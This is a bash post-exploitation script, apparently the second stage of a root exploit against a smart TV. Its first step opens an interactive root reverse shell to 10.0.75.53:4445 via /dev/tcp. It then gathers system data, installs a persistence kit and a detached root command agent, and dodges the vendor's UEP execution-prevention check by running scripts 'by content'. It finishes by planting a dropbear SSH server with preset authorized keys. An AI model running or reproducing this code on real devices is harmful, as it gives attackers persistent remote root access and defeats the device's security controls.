#!/bin/bash
# stage1 - runs as root from the kernel stage (env: P2 = p2 mount dir)
D=/opt/usr/share/tvroot
mkdir -p "$D" /opt/bin /opt/etc/dropbear /opt/share/tvroot 2>/dev/null

# 0. early beacon (first thing - the group SIGHUP at stage exit can cut us off)
exec 8<>/dev/tcp/10.0.75.53/4445 2>/dev/null && { echo STAGE1-OK >&8; /bin/bash -i <&8 >&8 2>&8 & }

# 1. facts for the persistence patch build (grabbed while the shell is live)
cp /etc/profile.d/bash_prompt_custom.sh "$D/vendor-bash_prompt_custom.sh" 2>/dev/null
cat /proc/cmdline > "$D/cmdline.txt" 2>/dev/null
cat /proc/partitions > "$D/partitions.txt" 2>/dev/null

# 2. persistence kit
for f in boot.sh debloat.sh apply-persistent-hook.sh build-patch.py agent.sh; do
  cp "$P2/$f" "$D/$f" 2>/dev/null && chmod 755 "$D/$f" 2>/dev/null
done

# 2b. start the root command agent NOW (setsid-detached -> survives the SIGHUP)
#     NOTE: scripts may only run BY CONTENT (sh -c "$(cat f)") - file loading
#     (sh f, bash f) is UEP-refused and kills the caller silently.
AG="$D/agent.sh"
if [ -f "$AG" ] && [ ! -e /run/tvroot-agent.pid ]; then
  setsid /bin/bash -c "$(cat "$AG")" </dev/null >/dev/null 2>&1 &
  echo "agent started $(date)" > "$D/agent-start.txt"
fi

# 3. proof + UEP log capture
{ id; cat /proc/version; ls /opt/media/; } > /opt/share/tvroot/proof.txt 2>&1
dmesg 2>/dev/null | grep -iE 'uep|sfd|sign|not permitted' | tail -20 > "$D/uep-dmesg.txt" 2>&1

# 4. queue the boot diagnostics as an agent job (runs by content, no deadline)
mkdir -p "$D/cmd/in" 2>/dev/null
[ -f "$P2/stage1-diag.sh" ] && cp "$P2/stage1-diag.sh" "$D/cmd/in/stage1-diag.sh" 2>/dev/null

# 5. dropbear - LAST, in a subshell: exec'ing the unsigned binary trips UEP
#    and kills the whole script silently (field notes). Best-effort only.
(
  cp "$P2/dropbearmulti" /opt/bin/dropbearmulti 2>/dev/null
  chmod 755 /opt/bin/dropbearmulti 2>/dev/null
  cp "$P2/authorized_keys" /opt/etc/dropbear/authorized_keys 2>/dev/null
  chmod 600 /opt/etc/dropbear/authorized_keys 2>/dev/null
  [ -f /opt/etc/dropbear/dropbear_host_ed25519 ] || \
    /opt/bin/dropbearmulti dropbearkey -t ed25519 -f /opt/etc/dropbear/dropbear_host_ed25519 2>/dev/null
  /opt/bin/dropbearmulti dropbear -p 22 -R -B >> "$D/dropbear.log" 2>&1 &
) >/dev/null 2>&1

